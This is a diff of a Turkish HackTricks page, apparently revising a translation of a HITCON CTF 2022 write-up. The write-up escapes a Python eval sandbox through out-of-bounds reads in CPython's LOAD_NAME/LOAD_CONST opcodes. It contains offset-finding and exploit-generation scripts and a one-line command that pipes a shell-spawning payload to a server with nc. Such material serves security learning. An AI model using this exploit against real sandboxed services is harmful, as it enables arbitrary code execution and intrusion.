@@ -1,43 +1,40 @@
-# LOAD\_NAME / LOAD\_CONST opcode OOB Okuma
+# LOAD_NAME / LOAD_CONST opcode OOB Okuma
+
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 
 **Bu bilgi** [**bu yazıdan alınmıştır**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-LOAD\_NAME / LOAD\_CONST opcode'da OOB okuma özelliğini kullanarak bellekteki bazı sembolleri elde edebiliriz. Bu, istediğiniz sembolü (örneğin fonksiyon adı gibi) elde etmek için `(a, b, c, ... yüzlerce sembol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir hile kullanmaktır.
+LOAD_NAME / LOAD_CONST opcode'daki OOB okuma özelliğini kullanarak bellekteki bazı sembolleri alabiliriz. Bu, istediğiniz sembolü (örneğin işlev adı) almak için `(a, b, c, ... yüzlerce sembol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir hile kullanmaktır.
 
 Sonra sadece saldırınızı oluşturun.
 
 ### Genel Bakış <a href="#overview-1" id="overview-1"></a>
 
-Kaynak kodu oldukça kısa, sadece 4 satırdan oluşuyor!
+Kaynak kodu oldukça kısadır, sadece 4 satır içerir!
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-Arbitrary Python kodu girebilirsiniz ve bu, bir [Python kod nesnesine](https://docs.python.org/3/c-api/code.html) derlenecektir. Ancak, bu kod nesnesinin `co_consts` ve `co_names` özellikleri, kod nesnesini değerlendirmeden önce boş bir demetle değiştirilecektir.
+### Sınır Dışı Okuma <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-Bu şekilde, sabitler (örneğin sayılar, dizeler vb.) veya isimler (örneğin değişkenler, fonksiyonlar) içeren tüm ifadeler sonunda hafıza ihlali nedeniyle çökmeye neden olabilir.
-
-### Sınırlar Dışında Okuma <a href="#out-of-bound-read" id="out-of-bound-read"></a>
-
-Hafıza ihlali nasıl oluşur?
+Segmentation fault nasıl meydana gelir?
 
 Basit bir örnek ile başlayalım, `[a, b, c]` aşağıdaki bytecode'a derlenebilir.
 ```
@@ -47,11 +44,11 @@ Basit bir örnek ile başlayalım, `[a, b, c]` aşağıdaki bytecode'a derlenebi
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Ancak `co_names` boş bir tuple haline gelirse ne olur? `LOAD_NAME 2` opcode hala çalıştırılır ve değeri orijinal olarak olması gereken bellek adresinden okumaya çalışır. Evet, bu bir out-of-bound read "özelliği".
+Ancak `co_names` boş bir demet haline gelirse ne olacak? `LOAD_NAME 2` opcode hala çalıştırılır ve aslında olması gereken bellek adresinden değeri okumaya çalışır. Evet, bu bir sınır dışı okuma "özelliği".
 
-Çözüm için temel kavram basittir. CPython gibi bazı opcodes'lar, örneğin `LOAD_NAME` ve `LOAD_CONST`, OOB okumaya karşı savunmasızdır (?).
+Çözüm için temel kavram oldukça basittir. CPython'daki bazı opcode'lar örneğin `LOAD_NAME` ve `LOAD_CONST`, sınır dışı okumaya açıktır (?).
 
-Bu opcodes'lar, `consts` veya `names` tuple'ından (bunlar `co_consts` ve `co_names` olarak adlandırılır) `oparg` indisindeki bir nesneyi alır. CPython'ın `LOAD_CONST` opcode'yu işlerken ne yaptığını görmek için aşağıdaki kısa örneğe bakabiliriz.
+Onlar, `co_consts` ve `co_names` altında adlandırılan `consts` veya `names` demetinden `oparg` dizininden bir nesne alırlar. CPython'ın `LOAD_CONST` opcode'unu işlediğinde ne yaptığını görmek için aşağıdaki kısa parçaya başvurabiliriz.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -61,21 +58,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Bu şekilde, OOB özelliğini kullanarak keyfi bellek ofsetinden bir "isim" alabiliriz. Hangi isme sahip olduğunu ve ofsetinin ne olduğunu belirlemek için sadece `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... denemeye devam edin. Ve oparg > 700 civarında bir şey bulabilirsiniz. Tabii ki bellek düzenine bakmak için gdb'yi de kullanabilirsiniz, ama daha kolay olacağını düşünmüyorum?
+Bu şekilde, OOB özelliğini kullanarak keyfi bellek ofsetinden bir "isim" alabiliriz. Hangi isme sahip olduğunu ve ofsetinin ne olduğunu belirlemek için sadece `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... denemeye devam edin. Ve yaklaşık olarak oparg > 700 olduğunda bir şeyler bulabilirsiniz. Tabii ki bellek düzenine bakmak için gdb kullanmayı da deneyebilirsiniz, ama daha kolay olacağını sanmıyorum?
 
-### Exploit Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+### Saldırıyı Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-İsimler / sabitler için bu kullanışlı ofsetleri elde ettikten sonra, bu ofsetten bir isim / sabit nasıl alır ve kullanırız? İşte size bir hile:\
-5 ofsetinden (`LOAD_NAME 5`) `co_names=()` ile `__getattribute__` adını alabiliyorsak, sadece aşağıdaki adımları izleyin:
+İsimler / sabitler için bu yararlı ofsetleri aldıktan sonra, bu ofsetten bir isim / sabit nasıl alınır ve kullanılır? İşte size bir ipucu:\
+Bir `__getattribute__` ismini ofset 5 (`LOAD_NAME 5`) ile `co_names=()` alabileceğimizi varsayalım, o zaman sadece aşağıdaki adımları uygulayın:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Dikkat edin, onu `__getattribute__` olarak adlandırmak zorunda değilsiniz, daha kısa veya daha garip bir şey olarak adlandırabilirsiniz.
+> `__getattribute__` olarak adlandırmanız gerekli değildir, daha kısa veya daha garip bir isim verebilirsiniz
 
-Sadece bytecode'una bakarak nedenini anlayabilirsiniz:
+Sadece bayt kodunu görüntüleyerek nedenini anlayabilirsiniz:
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -92,7 +89,7 @@ Sadece bytecode'una bakarak nedenini anlayabilirsiniz:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-`LOAD_ATTR` komutunun da `co_names` üzerinden ismi alındığını fark edin. Python, isim aynı ise aynı ofsetten isimleri yükler, bu yüzden ikinci `__getattribute__` hala offset=5'ten yüklenir. Bu özelliği kullanarak isim bellekte yakınsa herhangi bir isim kullanabiliriz.
+`LOAD_ATTR`'ın adı da `co_names`'den alındığını unutmayın. Python, isim aynıysa aynı ofsetten isimleri yükler, bu nedenle ikinci `__getattribute__` hala offset=5'ten yüklenir. Bu özelliği kullanarak isim belleğe yakın olduğunda keyfi isim kullanabiliriz.
 
 Sayıları oluşturmak basit olmalı:
 
@@ -101,11 +98,11 @@ Sayıları oluşturmak basit olmalı:
 * 2: (not \[]) + (not \[])
 * ...
 
-### Saldırı Betiği <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Sızma Betiği <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Uzunluk sınırlaması nedeniyle sabitler kullanmadım.
+Uzunluk sınırı nedeniyle sabitleri kullanmadım.
 
-İlk olarak, isimlerin bu ofsetlerini bulmak için bir betik aşağıda verilmiştir.
+İlk olarak, isimlerin ofsetlerini bulmamız için bir betik aşağıda verilmiştir.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -140,7 +137,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-Ve aşağıdaki gerçek Python saldırısını oluşturmak için kullanılır.
+Ve aşağıdakiler gerçek Python saldırısını oluşturmak içindir.
 ```python
 import sys
 import unicodedata
@@ -217,7 +214,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Temel olarak, `__dir__` yönteminden aldığımız dizeler için aşağıdaki işlemleri yapar:
+Bu temelde, `__dir__` yönteminden aldığımız dizeler için aşağıdaki işlemleri yapar:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -230,16 +227,17 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarına katkıda bulunun.**
 
 </details>
+{% endhint %}
